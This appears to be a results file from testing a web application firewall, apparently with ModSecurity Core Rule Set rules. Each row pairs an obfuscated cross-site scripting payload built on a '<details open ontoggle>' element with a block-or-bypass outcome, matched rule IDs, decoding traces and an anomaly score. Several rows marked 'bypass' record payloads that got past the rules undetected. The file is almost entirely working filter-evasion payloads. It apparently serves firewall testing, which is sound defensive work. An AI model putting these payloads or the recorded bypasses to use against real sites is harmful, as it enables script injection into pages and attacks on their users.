1111,"<details open ontoggle='(Function[""constru""+""ctor""](""var a=btoa;eval(atob(a(String.fromCharCode(97,108,101,114,116,40,49,41))))""))()'>",0,1,block,8,"932100,933160,933210,934100,934100,941100,941120,949110","o63,5v217,134 || o64,68v217,134 || o24,108v217,134t:urlDecode,t:replaceComments,t:compressWhitespace || o64,5v217,134 || o64,5v217,134t:urlDecodeUni || v217,134t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,134t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,177826604717.800283
1115,"<details open ontoggle='(function(){return this})()[""Funct""+""ion""](""var a=btoa;eva\x6c(atob(a(String.fromCharCode(97,108,101,114,116,40,49,41))))"")()'>",0,1,block,6,"933210,934100,934100,941100,941120,949110","o24,125v217,151t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,151 || o25,11v217,151t:urlDecodeUni || v217,151t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,151t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177826605735.194828
1117,"<details open ontoggle='(self.Function)(""var a=btoa;eva\x6c(atob(a(String.fromCharCode(97,108,101,114,116,40,49,41))))"")()'>",0,1,block,5,"933210,934100,941100,941120,949110","o24,98v217,124t:urlDecode,t:replaceComments,t:compressWhitespace || o67,19v217,124 || v217,124t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,124t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826606111.792049
1176,"<details open ontoggle='(this[""constructor""][""constructor""](""ale""+""rt(1)""))()'>",0,1,block,5,"933210,941100,941120,941370,949110","o24,53v217,79t:urlDecode,t:replaceComments,t:compressWhitespace || v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o25,19v217,79t:urlDecodeUni,t:compressWhitespace || ",20,177826618815.112495
1191,"<details open ontoggle='(function(){return(window[atob(""YWxlcnQ="")])(1)})()'>",0,1,block,5,"934100,941100,941120,941370,949110","o25,11v217,77 || v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o43,24v217,77t:urlDecodeUni,t:compressWhitespace || ",20,177826621943.193585
1211,"<details open ontoggle='Function[""\x63onstructor""](""al""+""ert(1)"")()'></details>",0,1,bypass,2,"941100,941120","v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177826626274.653579
1213,"<details open ontoggle='(()=>{}).constructor(""ale""+""rt(1)"")()'></details>",0,1,bypass,2,"941100,941120","v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,17782662677.119905
1214,"<details open ontoggle='top[""Function""](""al""+""ert(1)"")()'></details>",0,1,block,5,"933210,941100,941120,941370,949110","o27,29v217,68t:urlDecode,t:replaceComments,t:compressWhitespace || v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,15v217,68t:urlDecodeUni,t:compressWhitespace || ",20,177826626913.097084
1215,"<details open ontoggle='self[""Function""](""aler""+""t(1)"")()'></details>",0,1,block,5,"933210,941100,941120,941370,949110","o28,29v217,69t:urlDecode,t:replaceComments,t:compressWhitespace || v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,16v217,69t:urlDecodeUni,t:compressWhitespace || ",20,177826627129.631615
1226,"<details open ontoggle='globalThis[""Function""](""aler""+""t(1)"")()'></details>",0,1,block,4,"933210,941100,941120,949110","o34,29v217,75t:urlDecode,t:replaceComments,t:compressWhitespace || v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826629685.126146
1284,"<details open ontoggle='top.Function(atob(""YWxlcnQoMSk=""))()'></details>",0,1,bypass,2,"941100,941120","v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177826642136.198815
1287,"<details open ontoggle='Function.call(null,atob(""YWxlcnQoMSk=""))()'></details>",0,1,bypass,2,"941100,941120","v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177826642757.708642
1288,"<details open ontoggle='Function.apply(null,[atob(""YWxlcnQoMSk="")])()'></details>",0,1,bypass,2,"941100,941120","v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177826642966.479139
1289,"<details open ontoggle='(function(){}).constructor(atob(""YWxlcnQoMSk=""))()'></details>",0,1,block,4,"934100,941100,941120,949110","o25,11v217,86 || v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17782664312.085169
1309,"<details open ontoggle='Function.constructor.constructor(""al""+""ert(1)"")()'>",0,1,bypass,2,"941100,941120","v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,17782664749.764561
1312,"<details open ontoggle='top[""Function""](""ale""+""rt(1)"")()'>",0,1,block,5,"933210,941100,941120,941370,949110","o27,29v217,58t:urlDecode,t:replaceComments,t:compressWhitespace || v217,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,15v217,58t:urlDecodeUni,t:compressWhitespace || ",20,177826648199.099422
1342,"<details open ontoggle='top.Function(atob(""YWxlcnQoMSk=""))()'>",0,1,bypass,2,"941100,941120","v216,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v216,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177826654671.272243
1358,"<details open ontoggle='(function(){return this.constructor.constructor(String.fromCharCode(97,108,101,114,116,40,49,41))()})()'>",0,1,block,4,"934100,941100,941120,949110","o25,11v217,129 || v217,129t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,129t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826658055.746125
1360,"<details open ontoggle='Function[""constru""+""ctor""](""al""+""ert(1)"")()'>",0,1,block,4,"933210,941100,941120,949110","o32,35v217,69t:urlDecode,t:replaceComments,t:compressWhitespace || v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826658578.796896
1373,"<details open ontoggle='(1,new(Function.bind.apply(Function,["""",String[""fromCharCode""](97,108,101,114,116,40,49,41)])))()'>",0,1,block,4,"933210,941100,941120,949110","o70,51v217,123t:urlDecode,t:replaceComments,t:compressWhitespace || v217,123t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,123t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826661321.914713
1378,"<details open ontoggle=(function(){window[String.fromCharCode(101,118,97,108)](String.fromCharCode(97,108,101,114,116,40,49,41));})()>",0,1,block,5,"934100,941100,941120,941370,949110","o24,11v217,134 || v217,134t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,134t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o35,43v217,134t:urlDecodeUni,t:compressWhitespace || ",20,177826662368.997176
1379,"<details open ontoggle=(function(){this['constr'+'uctor']['constr'+'uctor'](String.fromCharCode(97,108,101,114,116,40,49,41))();})()>",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o23,109v217,133t:urlDecode,t:replaceComments,t:compressWhitespace || o24,11v217,133 || o24,11v217,133t:urlDecodeUni || v217,133t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,133t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o35,22v217,133t:urlDecodeUni,t:compressWhitespace || ",30,177826662570.454992
1380,<details open ontoggle=(function(){[]['fill']['constructor']('ale'+'rt(1)')();})()>,0,1,block,6,"933210,934100,934100,941100,941120,949110","o23,59v217,83t:urlDecode,t:replaceComments,t:compressWhitespace || o24,11v217,83 || o24,11v217,83t:urlDecodeUni || v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177826662750.912202
1381,<details open ontoggle=(function(){top['e'+'v'+'a'+'l'](atob('YWxlcnQoMSk='));})()>,0,1,block,8,"932105,933210,934100,934100,941100,941120,941370,949110","o32,6v217,83 || o23,59v217,83t:urlDecode,t:replaceComments,t:compressWhitespace || o24,11v217,83 || o24,11v217,83t:urlDecodeUni || v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o35,20v217,83t:urlDecodeUni,t:compressWhitespace || ",35,177826662981.705880
1382,"<details open ontoggle=(function(){Function(String.fromCharCode(97,108,101,114,116,40,49,41))();})()>",0,1,block,4,"934100,941100,941120,949110","o24,11v217,101 || v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17782666323.229225
1384,"<details open ontoggle=(function(){window['ev\u0061l'](String.fromCharCode(97,108,101,114,116,40,49,41));})()>",0,1,block,5,"934100,941100,941120,941370,949110","o24,11v217,110 || v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o35,19v217,110t:urlDecodeUni,t:compressWhitespace || ",20,177826663626.545575
1385,<details open ontoggle=(function(){self[atob('ZXZhbA==')]('ale'+'rt(1)');})()>,0,1,block,6,"934100,934100,941100,941120,941370,949110","o24,11v217,78 || o24,11v217,78t:urlDecodeUni || v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o35,22v217,78t:urlDecodeUni,t:compressWhitespace || ",25,177826663883.107453
1386,"<details open ontoggle=(function(){globalThis['e'+'val'](String.fromCharCode(97,108,101,114,116,40,49,41));})()>",0,1,block,6,"933210,934100,934100,941100,941120,949110","o23,88v217,112t:urlDecode,t:replaceComments,t:compressWhitespace || o24,11v217,112 || o24,11v217,112t:urlDecodeUni || v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177826664177.070626
1389,"<details open ontoggle=(function(){window['Function'](String.fromCharCode(97,108,101,114,116,40,49,41))();})()>",0,1,block,6,"933210,934100,941100,941120,941370,949110","o23,87v217,111t:urlDecode,t:replaceComments,t:compressWhitespace || o24,11v217,111 || v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o35,18v217,111t:urlDecodeUni,t:compressWhitespace || ",25,177826664711.784763
1392,"<details open ontoggle=(function(){(1,eval)(String.fromCharCode(97,108,101,114,116,40,49,41));})()>",0,1,block,5,"933210,934100,941100,941120,949110","o23,75v217,99t:urlDecode,t:replaceComments,t:compressWhitespace || o24,11v217,99 || v217,99t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,99t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826665381.844831
1393,"<details open ontoggle=(function(){({}).constructor.constructor(String.fromCharCode(97,108,101,114,116,40,49,41))();})()>",0,1,block,5,"933210,934100,941100,941120,949110","o23,97v217,121t:urlDecode,t:replaceComments,t:compressWhitespace || o24,11v217,121 || v217,121t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,121t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826665546.625786
1396,<details open ontoggle=(function(){[]['entries']['constructor']('ale'+'rt(1)')();})()>,0,1,block,6,"933210,934100,934100,941100,941120,949110","o23,62v217,86t:urlDecode,t:replaceComments,t:compressWhitespace || o24,11v217,86 || o24,11v217,86t:urlDecodeUni || v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177826666235.771333
1397,"<details open ontoggle=(function(){with(window)eval(String.fromCharCode(97,108,101,114,116,40,49,41));})()>",0,1,block,5,"933160,934100,941100,941120,949110","o47,59v217,107 || o24,11v217,107 || v217,107t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,107t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826666488.883780
1400,<details open ontoggle=(function(){window['ev'+'al'](window['at'+'ob']('YWxlcnQoMSk='))})()>,0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o23,68v217,92t:urlDecode,t:replaceComments,t:compressWhitespace || o24,11v217,92 || o24,11v217,92t:urlDecodeUni || v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o35,17v217,92t:urlDecodeUni,t:compressWhitespace || ",30,177826667080.125408
1401,"<details open ontoggle=(function(){(1,window['e\x76al'])(atob('YWxlcnQoMSk='))})()>",0,1,block,6,"933210,934100,941100,941120,941370,949110","o23,59v217,83t:urlDecode,t:replaceComments,t:compressWhitespace || o24,11v217,83 || v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o38,17v217,83t:urlDecodeUni,t:compressWhitespace || ",25,177826667238.865856
1402,"<details open ontoggle=(function(){self[String.fromCharCode(101,118,97,108)](atob('YWxlcnQoMSk='))})()>",0,1,block,5,"934100,941100,941120,941370,949110","o24,11v217,103 || v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o35,41v217,103t:urlDecodeUni,t:compressWhitespace || ",20,177826667448.292307
1403,<details open ontoggle=(function(){globalThis['e\u0076al'](atob('YWxlcnQoMSk='))})()>,0,1,block,4,"934100,941100,941120,949110","o24,11v217,85 || v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826667767.074790
1404,<details open ontoggle=(function(){with(window)e\u0076al(atob('YWxlcnQoMSk='))})()>,0,1,block,4,"934100,941100,941120,949110","o24,11v217,83 || v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826667925.631951
1405,"<details open ontoggle=(function(){return(window['eval']).call(this,atob('YWxlcnQoMSk='))})()>",0,1,block,5,"934100,941100,941120,941370,949110","o24,11v217,94 || v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o42,14v217,94t:urlDecodeUni,t:compressWhitespace || ",20,177826668170.250201
1407,"<details open ontoggle=(function(){top[atob('ZXZhbA==')].call(this,atob('YWxlcnQoMSk='))})()>",0,1,block,6,"932105,934100,941100,941120,941370,949110","o32,6v217,93 || o24,11v217,93 || v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o35,21v217,93t:urlDecodeUni,t:compressWhitespace || ",25,177826668641.723255
1408,<details open ontoggle=(function(){parent['e\u0076al'](parent['atob']('YWxlcnQoMSk='))})()>,0,1,block,5,"933210,934100,941100,941120,949110","o54,36v217,91t:urlDecode,t:replaceComments,t:compressWhitespace || o24,11v217,91 || v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826668836.526886
1410,<details open ontoggle=(function(){[1]['constructor']['constructor'](atob('YWxlcnQoMSk='))()})()>,0,1,block,5,"933210,934100,941100,941120,949110","o23,73v217,97t:urlDecode,t:replaceComments,t:compressWhitespace || o24,11v217,97 || v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826669240.446205
1411,<details open ontoggle=(function(){Function['prototype']['constructor'](atob('YWxlcnQoMSk='))()})()>,0,1,block,5,"933210,934100,941100,941120,949110","o23,76v217,100t:urlDecode,t:replaceComments,t:compressWhitespace || o24,11v217,100 || v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826669460.855598
1413,<details open ontoggle=(function(){Object['constructor']['constructor'](atob('YWxlcnQoMSk='))()})()>,0,1,block,5,"933210,934100,941100,941120,949110","o23,76v217,100t:urlDecode,t:replaceComments,t:compressWhitespace || o24,11v217,100 || v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826669941.368353
1414,<details open ontoggle=(function(){setTimeout['constructor'](atob('YWxlcnQoMSk='))()})()>,0,1,block,5,"933210,934100,941100,941120,949110","o23,65v217,89t:urlDecode,t:replaceComments,t:compressWhitespace || o24,11v217,89 || v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826670146.390534
1415,<details open ontoggle=(function(){(function(){})['constructor'](atob('YWxlcnQoMSk='))()})()>,0,1,block,6,"932100,933210,934100,941100,941120,949110","o32,12v217,93 || o23,69v217,93t:urlDecode,t:replaceComments,t:compressWhitespace || o24,11v217,93 || v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177826670311.526054
1416,"<details open ontoggle=(function(){Reflect['construct'](Function,[atob('YWxlcnQoMSk=')])()})()>",0,1,block,5,"933210,934100,941100,941120,949110","o23,71v217,95t:urlDecode,t:replaceComments,t:compressWhitespace || o24,11v217,95 || v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826670563.190601
1419,<details open ontoggle=(function(){top['al'+'ert']`1`})()>,0,1,block,7,"932105,934100,934100,941100,941120,941370,949110","o32,6v217,58 || o24,11v217,58 || o24,11v217,58t:urlDecodeUni || v217,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o35,15v217,58t:urlDecodeUni,t:compressWhitespace || ",30,177826671238.314919
1421,<details open ontoggle=(function(){frames['a\u006cert']`1`})()>,0,1,block,4,"934100,941100,941120,949110","o24,11v217,63 || v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826671671.300063
1422,<details open ontoggle=(function(){globalThis['aler'+'t']`1`})()>,0,1,block,5,"934100,934100,941100,941120,949110","o24,11v217,65 || o24,11v217,65t:urlDecodeUni || v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826671846.892505
1426,"<details open ontoggle=(function(){self[String.fromCharCode(97,108,101,114,116)]`1`})()>",0,1,block,5,"934100,941100,941120,941370,949110","o24,11v217,88 || v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o35,45v217,88t:urlDecodeUni,t:compressWhitespace || ",20,177826672772.170650
1427,<details open ontoggle=(function(){top['\141\154\145\162\164']`1`})()>,0,1,block,6,"932105,934100,941100,941120,941370,949110","o32,6v217,70 || o24,11v217,70 || v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o35,27v217,70t:urlDecodeUni,t:compressWhitespace || ",25,177826672933.050130
1428,"<details open ontoggle=(function(){self['al'+'ert'].call(null,1)})()>",0,1,block,6,"934100,934100,941100,941120,941370,949110","o24,11v217,69 || o24,11v217,69t:urlDecodeUni || v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o35,16v217,69t:urlDecodeUni,t:compressWhitespace || ",25,177826673128.937881
1429,"<details open ontoggle=(function(){top['ale'+'rt'].apply(null,[1])})()>",0,1,block,7,"932105,934100,934100,941100,941120,941370,949110","o32,6v217,71 || o24,11v217,71 || o24,11v217,71t:urlDecodeUni || v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o35,15v217,71t:urlDecodeUni,t:compressWhitespace || ",30,177826673316.576512
1433,<summary><details open ontoggle=(function(){self['a'+'lert']`1`})()>,0,1,block,6,"934100,934100,941100,941120,941370,949110","o33,11v217,68 || o33,11v217,68t:urlDecodeUni || v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o22,10v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o44,16v217,68t:urlDecodeUni,t:compressWhitespace || ",25,177826674237.383081
1434,<marquee><details open ontoggle=(function(){top['al'+'ert']`1`})()>,0,1,block,8,"932105,934100,934100,941100,941120,941160,941370,949110","o41,6v217,67 || o33,11v217,67 || o33,11v217,67t:urlDecodeUni || v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o22,10v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o44,15v217,67t:urlDecodeUni,t:compressWhitespace || ",35,177826674457.545338
1435,<article><details open ontoggle=(function(){parent['ale'+'rt']`1`})()>,0,1,block,5,"934100,934100,941100,941120,949110","o33,11v217,70 || o33,11v217,70t:urlDecodeUni || v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o22,10v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826674633.338916
1438,<details open ontoggle=Function('al'+'ert(1)')()>,0,1,bypass,2,"941100,941120","v216,49t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v216,49t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177826675323.374107
1439,<details open ontoggle=Function('\u0061l'+'ert(1)')()>,0,1,bypass,2,"941100,941120","v216,54t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v216,54t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177826675584.740747
